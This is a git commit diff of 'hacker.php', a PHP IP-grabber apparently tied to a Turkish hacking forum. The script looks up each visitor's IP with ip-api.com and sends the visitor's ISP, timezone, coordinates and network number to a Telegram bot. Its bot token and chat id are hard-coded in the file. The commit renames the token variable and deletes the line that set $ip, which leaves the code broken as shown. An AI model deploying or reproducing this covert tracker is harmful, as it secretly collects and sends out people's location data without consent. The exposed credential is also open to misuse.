3e46097ca0925acb88504e4309b934a81ca6e632
zebra <91216396+car-bomb@users.noreply.github.com>
2021-12-26 11:20:18 +0300

    Update hacker.php

--- hacker.php
+++ hacker.php
@@ -1,18 +1,18 @@
 <?php
 
 function telegram($msg) {
-        global $telegrambot,$telegramchatid;
-        $url = 'https://api.telegram.org/bot'.$telegrambot.'/sendMessage';$data = array('chat_id'=>$telegramchatid,'text'=>$msg);
+        global $run,$telegramchatid;
+        $url = 'https://api.telegram.org/bot'.$run.'/sendMessage';$data = array('chat_id'=>$telegramchatid,'text'=>$msg);
         $options = array('http'=>array('method' => 'POST','header' => "Content-Type:application/x-www-form-urlencoded\r\n",'content' => http_build_query($data),),);
         $context = stream_context_create($options);
         $result = file_get_contents($url,false,$context);
         return $result;
 }
 
-$telegrambot = '5055359847:AAGZCWRXgmB7rWAK45zQrB1NWL7ZruK0l9s'; // enter bot token
-$telegramchatid = 1887870506; // enter chat id
+$run = '5055359847:AAGZCWRXgmB7rWAK45zQrB1NWL7ZruK0l9s'; 
+$telegramchatid = 1887870506;
 
-$ip=$_SERVER['REMOTE_ADDR']; 
+
 $ipapi = json_decode(file_get_contents("http://ip-api.com/json/{$ip}"));
 $datetime = date("d.m.Y H:i:s"); // g:ia l F j Y   l, F j, Y, g:ia
 
@@ -31,16 +31,13 @@ telegram("Yeni kullanım:
         Time  :  $datetime
         Internet Provider  :  $ipapi->isp ($ipapi->org)
         Saat Dilimi  :  $ipapi->timezone
-        Lat & Lon :  $ipapi->lat ($ipapi->lon)
+        Lat & Lon :  $ipapi->lat $ipapi->lon
         Ass  :  $ipapi->as
         
 
 
         @TR_HACK_FORUM Owner= @Cakma_H4CK3R
         ");
-
-// Operating system $user_os
-// Browser $user_browser
 
 
 
